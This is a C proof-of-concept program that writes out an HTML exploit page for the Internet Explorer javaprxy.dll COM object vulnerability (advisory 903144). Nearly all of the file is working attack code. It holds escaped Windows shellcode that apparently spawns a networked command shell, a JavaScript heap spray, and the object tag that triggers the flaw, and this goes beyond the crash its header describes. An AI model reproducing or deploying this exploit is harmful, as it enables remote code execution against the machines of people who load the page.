/*
    Vulnerability: Microsoft Security Advisory (903144)
                   A COM Object (Javaprxy.dll) Could Cause Internet Explorer to Unexpectedly Exit
    Discovered by: http://www.sec-consult.com/184.html
        Credit: http://www.frsirt.com/

    C0ded by: K.K.Senthil Velan, Information Assurance Engineer.
        reach me@  senthilvelan@gmail.com

        Usage: IE_Javaprxy_Poc > xpl_page.html
        then load the xpl_page.html. In my test, it crashes the IE.
        Tested versions:  Internet Explorer 6.0, Windows 2000 SP4
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>


int main()
{
        char *xpl_header, *xpl_shellcode, *xpl_code, *xpl_classid, *xpl_footer;

        xpl_header = (char*)calloc(50,sizeof(char));
        xpl_shellcode = (char*)calloc(1100,sizeof(char));
        xpl_code = (char*)calloc(500,sizeof(char));
        xpl_classid = (char*)calloc(30,sizeof(char));
        xpl_footer = (char*)calloc(350,sizeof(char));

        strcpy(xpl_header,"<html><body>\n<SCRIPT language=\"javascript\">\n");
        strcpy(xpl_shellcode,"shellcode = unescape(\"%u4343\"+\"%u4343\"+\"%u43eb%u5756%u458b%u8b3c%u0554%u0178%u52ea%u528b%u0120%u31ea%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%
u13cf%u01ac%u85c7%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64%u3040%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub86
6%u6c6c%u6850%u3233%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe%uff90%uffff%uef89%uc589%uc481%ufe70%uffff%u3154%ufec0%u40c4%ubb50%u7d22%u7dab%u75e8%uffff%u31ff%u50c0%u5050%u4
050%u4050%ubb50%u55a6%u7934%u61e8%uffff%u89ff%u31c6%u50c0%u3550%u0102%ucc70%uccfe%u8950%u50e0%u106a%u5650%u81bb%u2cb4%ue8be%uff42%uffff%uc031%u5650%ud3bb%u58fa%ue89b%uff34%
uffff%u6058%u106a%u5054%ubb56%uf347%uc656%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964%u41e1%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353%u5353%u5353%u6a53%u894
4%u53e0%u5353%u5453%u5350%u5353%u5343%u534b%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe%u5bff%uc031%u5048%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff%uef87%u12bb%u6d6b%ue8d0%ufec2%uf
fff%uc483%u615c%u89eb\")\;\n");
        strcpy(xpl_code,"bigblock = unescape(\"%u0D0D%u0D0D\")\;\nheadersize = 20;\nslackspace = headersize+shellcode.length\nwhile (bigblock.length<slackspace) bigblock+=b
igblock;\nfillblock = bigblock.substring(0, slackspace);\nblock = bigblock.substring(0, bigblock.length-slackspace);\nwhile(block.length+slackspace<0x40000) block = block+b
lock+fillblock;\nmemory = new Array();\nfor (i=0;i<750;i++) memory[i] = block + shellcode;\n</SCRIPT>\n");
        strcpy(xpl_classid,"03D9F3F2-B0E3-11D2-B081-006008039BF0");

        sprintf(xpl_footer,"<object classid=\"CLSID:%s\"></object>\nMicrosoft Internet Explorer javaprxy.dll COM Object Remote Exploit\nby the FrSIRT < http://www.frsirt.co
m >\nSolution - http://www.microsoft.com/technet/security/advisory/903144.mspx</body><script>location.reload();</script></html>",xpl_classid);

        printf("%s%s%s%s",xpl_header,xpl_shellcode,xpl_code,xpl_footer);
        return 0;
}

